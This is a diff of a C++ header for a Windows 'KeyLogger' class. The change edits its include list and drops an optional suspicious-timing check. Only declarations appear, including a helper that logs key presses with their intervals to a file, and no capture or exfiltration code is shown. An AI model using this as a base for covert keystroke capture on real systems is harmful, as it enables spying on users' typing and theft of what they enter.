@@ -2,9 +2,12 @@
 #define KEY_LOGGER_H
 
 #include <windows.h>
-#include <fstream>
 #include <chrono>
+#include <fstream>
+#include <iomanip>
+#include <iostream>
 #include <vector>
+#include <sstream>
 
 class KeyLogger
 {
@@ -26,9 +29,6 @@ private:
 
     // Helper method to log the key press to file
     void LogKeyStroke(DWORD vkCode, int interval);
-
-    // Optional method to check for suspicious timing patterns
-    void CheckForSuspiciousActivity(int interval);
 
 public:
     KeyLogger();
